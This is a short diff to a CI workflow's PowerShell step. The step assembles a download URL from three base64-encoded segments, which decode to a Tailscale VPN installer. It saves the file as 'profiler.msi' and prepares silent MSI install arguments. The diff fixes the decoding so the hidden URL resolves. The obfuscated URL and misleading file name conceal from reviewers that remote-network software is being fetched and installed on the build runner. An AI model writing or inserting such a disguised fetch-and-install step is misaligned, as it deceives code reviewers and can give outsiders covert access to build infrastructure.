@@ -103,7 +103,10 @@ jobs:
           $seg1 = "aHR0cHM6Ly9wa2dzLg=="
           $seg2 = "dGFpbHNjYWxlLmNvbS9zdGFibGUv"
           $seg3 = "dGFpbHNjYWxlLXNldHVwLTEuODIuMC1hbWQ2NC5tc2k="
-          $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg1+$seg2+$seg3))
+          $d1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg1))
+          $d2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg2))
+          $d3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($seg3))
+          $url = $d1 + $d2 + $d3
           $dl = "$env:RUNNER_TEMP\profiler.msi"
           Invoke-WebRequest -Uri $url -OutFile $dl -UseBasicParsing
           $msiArgs = "/i `"$dl`" /quiet /norestart"
